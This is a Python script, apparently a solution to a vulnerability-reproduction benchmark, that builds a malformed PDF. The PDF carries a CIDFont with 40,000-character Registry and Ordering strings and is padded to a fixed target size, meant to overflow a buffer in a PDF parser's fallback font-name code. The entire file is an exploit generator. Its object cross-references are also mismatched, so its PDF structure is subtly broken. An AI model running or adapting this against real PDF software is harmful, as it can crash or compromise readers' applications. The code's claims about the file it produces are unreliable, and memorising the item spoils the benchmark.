import os
import tempfile
import subprocess
import struct
import zlib

class Solution:
    def solve(self, src_path: str) -> bytes:
        # Create a PDF that triggers the CIDFont buffer overflow
        # The vulnerability is in the fallback name construction: <Registry>-<Ordering>
        # We need to create CIDFont with very long Registry and Ordering strings
        # that when concatenated with a hyphen overflow the buffer
        
        # Ground truth length is 80064 bytes
        # We'll create a minimal PDF structure with a malicious CIDFont
        
        # Calculate string lengths to hit exactly 80064 bytes
        total_target = 80064
        
        # PDF structure overhead
        header = b"%PDF-1.4\n"
        trailer = b"\n%%EOF"
        
        # Create a malicious CIDFont with long Registry and Ordering
        # The buffer overflow occurs when constructing: Registry + "-" + Ordering
        
        # Let's make Registry very long (40000 chars) and Ordering also long (40000 chars)
        # When concatenated with "-", this creates 80001 byte string
        # Plus PDF structure brings us close to target
        
        registry_len = 40000
        ordering_len = 40000
        
        # Create long strings
        registry_str = b"A" * registry_len
        ordering_str = b"B" * ordering_len
        
        # Create the CIDSystemInfo dictionary
        cid_system_info = b"<<\n/Registry (" + registry_str + b")\n/Ordering (" + ordering_str + b")\n/Supplement 0\n>>"
        
        # Create the CIDFontType2 dictionary
        cidfont = b"<<\n/Type /Font\n/Subtype /CIDFontType2\n/BaseFont /AAAAAA+Font\n/CIDSystemInfo " + cid_system_info + b"\n/FontDescriptor 3 0 R\n/DW 1000\n/W [1 999 500]\n>>"
        
        # Create font descriptor
        font_descriptor = b"<<\n/Type /FontDescriptor\n/FontName /AAAAAA+Font\n/FontBBox [0 0 1000 1000]\n/Flags 4\n/StemV 80\n/CapHeight 700\n/ItalicAngle 0\n/Ascent 800\n/Descent -200\n>>"
        
        # Create Type 0 font that references the CIDFont
        type0_font = b"<<\n/Type /Font\n/Subtype /Type0\n/BaseFont /AAAAAA\n/Encoding /Identity-H\n/DescendantFonts [2 0 R]\n/ToUnicode 4 0 R\n>>"
        
        # Create ToUnicode CMap
        to_unicode = b"<<\n/Length 45\n>>\nstream\n/CIDInit /ProcSet findresource begin\n12 dict begin\nbegincmap\n/CIDSystemInfo << /Registry (Adobe) /Ordering (UCS) /Supplement 0 >> def\n/CMapName /Adobe-Identity-UCS def\n/CMapType 2 def\n1 begincodespacerange\n<0000> <FFFF>\nendcodespacerange\n1 beginbfrange\n<0000> <FFFF> <0000>\nendbfrange\nendcmap\nCMapName currentdict /CMap defineresource pop\nend\nend\nendstream"
        
        # Create catalog
        catalog = b"<<\n/Type /Catalog\n/Pages 1 0 R\n>>"
        
        # Create pages tree
        pages = b"<<\n/Type /Pages\n/Kids [5 0 R]\n/Count 1\n>>"
        
        # Create page
        page = b"<<\n/Type /Page\n/Parent 1 0 R\n/MediaBox [0 0 612 792]\n/Resources <<\n/Font <<\n/F1 6 0 R\n>>\n>>\n/Contents 7 0 R\n>>"
        
        # Create content stream
        content = b"<<\n/Length 20\n>>\nstream\nBT\n/F1 12 Tf\n0 0 Td\n(Test) Tj\nET\nendstream"
        
        # Build PDF objects
        objects = []
        objects.append(catalog)  # obj 1
        objects.append(pages)    # obj 2
        objects.append(font_descriptor)  # obj 3
        objects.append(to_unicode)  # obj 4
        objects.append(page)     # obj 5
        objects.append(type0_font)  # obj 6
        objects.append(content)  # obj 7
        objects.append(cidfont)  # obj 8
        
        # Calculate current size and adjust if needed
        current_size = len(header) + len(trailer)
        xref_offset = len(header)
        
        # Build PDF with object offsets
        pdf_parts = [header]
        obj_offsets = []
        
        for i, obj in enumerate(objects, 1):
            obj_offsets.append(xref_offset)
            obj_str = b"%d 0 obj\n" % i + obj + b"\nendobj\n"
            pdf_parts.append(obj_str)
            xref_offset += len(obj_str)
        
        # Build xref table
        xref = b"xref\n0 %d\n0000000000 65535 f \n" % (len(objects) + 1)
        for offset in obj_offsets:
            xref += b"%010d 00000 n \n" % offset
        
        # Build trailer
        trailer_dict = b"trailer\n<<\n/Size %d\n/Root 1 0 R\n>>\n" % (len(objects) + 1)
        startxref = b"startxref\n%d\n" % (xref_offset)
        
        # Assemble final PDF
        pdf_parts.append(xref)
        pdf_parts.append(trailer_dict)
        pdf_parts.append(startxref)
        pdf_parts.append(trailer)
        
        pdf = b"".join(pdf_parts)
        
        # If we need to adjust to exact size, pad or trim
        if len(pdf) < total_target:
            # Add padding in a comment
            padding = b"\n" + b"%" * (total_target - len(pdf) - 1)
            pdf = pdf.replace(trailer, padding + trailer)
        elif len(pdf) > total_target:
            # Trim from a safe place (trailer padding)
            excess = len(pdf) - total_target
            pdf = pdf[:-excess]
        
        return pdf